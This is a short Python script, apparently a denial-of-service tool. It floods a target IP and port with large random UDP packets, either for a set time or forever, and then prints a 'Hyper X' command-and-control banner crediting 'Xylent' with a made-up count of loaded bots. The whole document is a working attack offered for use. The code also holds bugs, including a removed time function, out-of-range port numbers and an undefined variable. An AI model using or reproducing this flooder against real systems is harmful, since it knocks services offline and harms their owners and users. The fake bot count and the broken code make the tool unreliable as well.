#!/usr/bin/python
import socket,random,sys,time
 
if len(sys.argv)==1:
    sys.exit('Usage: udp.py ip port(0=random) length(0=forever)')
 
def UDPFlood():
    port = int(sys.argv[2])
    randport=(True,False)[port==0]
    ip = sys.argv[1]
    dur = int(sys.argv[3])
    clock=(lambda:0,time.clock)[dur>0]
    duration=(1,(clock()+dur))[dur>0]
    print('ZxC-UDP: %s:%s for %s seconds'%(ip,port,dur or 'infinite'))
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes=random._urandom(65500)
    while True:
        port=(random.randint(1,15000000),port)[randport]
        if clock()<duration:
            sock.sendto(bytes,(ip,port))
        else:
            break
    print (f'''

\033[1;35m                     ╔════════════════════════════════════════╗
\033[1;35m                               \033[1;34m╦ ╦╦ ╦╔═╗╔═╗╦═╗  ═╗ ╦
\033[1;35m                               \033[35m╠═╣╚╦╝╠═╝║╣ ╠╦╝  ╔╩╦╝
\033[1;35m                               \033[1;34m╩ ╩ ╩ ╩  ╚═╝╩╚═  ╩ ╚═
\033[1;35m                     ╚════════════════════════════════════════╝
\033[1;34m                        ║  \033[37m      Subscribe Xylent         \033[1;34m║
\033[1;35m              ╔════════════════════════════════════════════════════════════╗
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mHOST/IP              \033[1;34m:            [\033[34m<>\033[1;34m] \033[37m{host}
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mPORT                 \033[1;34m:            [\033[34m<>\033[1;34m] \033[37m{port}
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mMETHODS              \033[1;34m:            [\033[34m<>\033[1;34m] \033[37mHYPER-X
\033[1;35m              ╚════════════════════════════════════════════════════════════╝
\033[1;34m                             ║ \033[37m Loaded Bots: [{random.randrange(1, 10000)}]  \033[1;34m║
\033[1;34m                  ╔════════════════════════════════════════════════╗
\033[1;34m                  ║  \033[37m  Cnc Hyper X Build By Xylent 28/06/2023      \033[1;34m║       
\033[1;34m                  ╚════════════════════════════════════════════════╝
\033[0m
''')
UDPFlood()
